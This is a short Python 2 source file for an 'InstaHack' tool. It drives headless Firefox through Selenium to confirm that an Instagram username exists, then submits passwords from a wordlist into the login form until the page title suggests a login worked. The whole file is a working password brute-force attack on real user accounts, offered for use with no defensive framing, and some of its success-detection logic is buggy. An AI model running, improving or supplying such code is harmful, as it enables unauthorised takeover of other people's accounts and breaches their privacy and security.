# coding=utf-8
import src.librarys as libs
from src.Mask import TextColor

class InstaHack(object):
    def __init__(self, username, wordlist, delay):
        self.username = username
        self.wordlist = wordlist
        self.delay    = delay

    def execute(self):
        print TextColor.CYAN + "[*] Checking username is exist ..." + TextColor.WHITE
        if self.UserCheck(self.username) == True:
            libs.sys.exit(
                TextColor.RED + TextColor.UNDERLINE +
                "[!] Username was not found!"
                + TextColor.WHITE
            )

        print TextColor.GREEN + TextColor.BOLD + "[+] Username found! Continuing..." + TextColor.WHITE
        libs.sleep(2)
        print TextColor.CYAN + "[*] Checking wordlist is exist ..." + TextColor.WHITE
        libs.sleep(1)
        if self.WordList(self.wordlist) == False:
            libs.sys.exit(
                TextColor.RED + TextColor.UNDERLINE +
                "[!] Wordlist was not found!"
                + TextColor.WHITE
            )

        libs.sleep(1)
        print TextColor.GREEN + TextColor.BOLD + "[+] Using %s seconds delay. defualt is 1 second"%(self.delay)
        print
        print TextColor.ENDC + "--------------Start to test ----------------"
        print
        self.BruteForce(self.username, self.wordlist, self.delay)

    def WordList(self, path):
        if libs.os.path.exists(path):
            print TextColor.GREEN + TextColor.BOLD + "[+] Wordlist added successfully!" + TextColor.WHITE
            return True
        else:
            return False

    def UserCheck(self, username):
        options = libs.Options()
        options.add_argument('--headless')
        driver = libs.webdriver.Firefox(options=options)
        try:
            driver.get("https://instagram.com/" + username)
            assert (("Sorry, this page isn't available.") not in driver.page_source)
            driver.close()
        except AssertionError:
            return True

    def BruteForce(self, username, wordlist, delay = str(1)):
        options = libs.Options()
        options.add_argument('--headless')
        driver = libs.webdriver.Firefox(options=options)
        driver.get("https://www.instagram.com/accounts/login/?force_classic_login")

        counter = 0
        pass_list = []
        with open(wordlist, 'r') as file:
            for line in file.readlines():
                password = line.strip("\n")
                try:
                    element_username = driver.find_element_by_name('username')
                    element_username.clear()
                    element_username.send_keys(username)

                    element_password = driver.find_element_by_name('password')
                    element_password.clear()
                    element_password.send_keys(password)
                    element_password.send_keys(libs.Keys.RETURN)
                    libs.sleep(int(delay))

                    if "Log in — Instagram" not in driver.title:
                        print TextColor.GREEN + \
                              "[+] Password found!: %s\n"%(pass_list[counter - 1]) + \
                              TextColor.WHITE
                        libs.sys.exit(0)
                    else:
                        print TextColor.WARNING + TextColor.BOLD + \
                              "[*]try:%d | Username: %s -> password: %s\n"%(counter + 1, username, password) + \
                              TextColor.WHITE
                        counter = counter + 1
                        libs.sleep(int(delay))
                        pass_list.append(password)

                except Exception:
                    if "Log in — Instagram" not in driver.title:
                        libs.sys.exit(
                            TextColor.GREEN + TextColor.UNDERLINE + \
                            "[+] password found!: %s" %(password) +
                            TextColor.WHITE
                        )
                    else:
                        libs.sys.exit(
                            TextColor.RED + TextColor.UNDERLINE + \
                            "Error please wait for 5-8 mins and try again" + TextColor.WHITE
                        )